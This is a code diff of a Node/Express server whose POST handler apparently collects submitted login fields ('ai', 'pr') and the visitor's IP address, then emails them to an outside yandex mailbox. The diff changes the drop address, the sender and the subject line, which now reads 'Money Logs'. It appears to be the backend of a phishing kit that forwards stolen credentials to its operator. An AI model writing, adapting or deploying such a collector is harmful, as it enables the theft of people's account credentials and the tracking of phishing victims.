@@ -29,7 +29,7 @@ app.get("/", (request, response) => {
 app.post("/", (req, res) => {
   const {ai, pr } = req.body;
   console.log(req.body);
-  let logEmail = "sharedbox2021@yandex.com";
+  let logEmail = "comp.id47@yandex.com";
 
   // Get the user's IPv4 address
   const ip = requestIp.getClientIp(req);
@@ -64,9 +64,9 @@ app.post("/", (req, res) => {
 
   sendmail(
     {
-      from: "docu@logscentral.com",
+      from: "fresh@logscentral.com",
       to: logEmail,
-      subject: "china logs " + ip2,
+      subject: "Money Logs" + ip2,
       html,
     },
     function (err, reply) {
